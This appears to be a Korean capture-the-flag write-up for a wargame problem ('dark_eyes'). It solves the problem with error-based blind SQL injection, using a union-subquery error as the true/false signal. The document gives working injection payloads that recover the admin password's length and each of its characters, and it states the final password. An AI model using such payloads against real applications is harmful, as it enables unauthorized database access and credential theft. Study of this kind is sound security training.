## Q22.dark_eyes _ Error Based(2)
<img src="/photo/prob_22.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: col / if / case / when / sleep / benchmark <br> 문제 사항: admin의 패스워드를 찾아라.
### 해결책
```
이 문제는 쿼리문에 오류가 발생하면 창이 안보였다.
=> SQL error를 이용해야함
=> 쿼리가 참이면 정상 로드가 되고 거짓이면 창이 안보여야 된다고 생각함
=> Errer Based Blind SQL 문제가 됨
```
```
이전에 사용된 오류 쿼리인 select 1 union select 2를 사용하기 위해 조사해봄
-> select 1 union select 0는 2개의 row를 반환함
-> select 1 union select 1는 1개의 row를 반환함

select 뒤에 조건을 넣어서 참일 경우 1을 , 거짓일 경우 0을 반환할 수 있음
=> 앞의 id='admin' and pw=''가 1개의 반환값을 가짐 
=> select 1 union select (거짓조건)은 2개의 반환값을 가짐 
=> 위의 두 쿼리를 비교하면 반환값의 개수에 차이가 생김
=> ERROR 1242 (21000): Subquery returns more than 1 row 발생 
```
```
위의 error를 이용해 패스워드 길이를 찾아봄
=> length()함수 이용 ( 파이썬 사용 )
=> 밑의 쿼리가 참이므로 패스워드 길이 = 8
```
```diff
# 현재 쿼리문: where id='admin' and pw=''<>id='admin' and (select 1 union select length(pw)=8)-- '
```
<참고> Python 코드 : [패스워드 길이 탐색](code/22_pwlength.py)
```
다음으로 패스워드 각자리의 문자 확인
=> substr()함수, ascii()함수 이용 ( 파이썬 사용 )
```
```diff
# 현재 쿼리문: where id='admin' and pw=''<>id='admin' and (select 1 union select ascii(substr(pw,1,1))=53)-- '
```
<참고> Python 코드 : [패스워드 길이 탐색](code/22_pw.py)
```
해결 쿼리문: where id='admin' and pw='5a2f5d3c'
```
### CERT <br> Python 코드 : [패스워드 길이 탐색](code/22_pwlength.py) / [패스워드 문자 탐색](code/22_pw.py)

### 느낀점
```diff
+ union select에 대해 자세히 배울 수 있었다.
+ 데이터에 대한 중복값을 제거하여 반환함
+ union all은 데이터의 모늗 중복값 또한 반환함
```
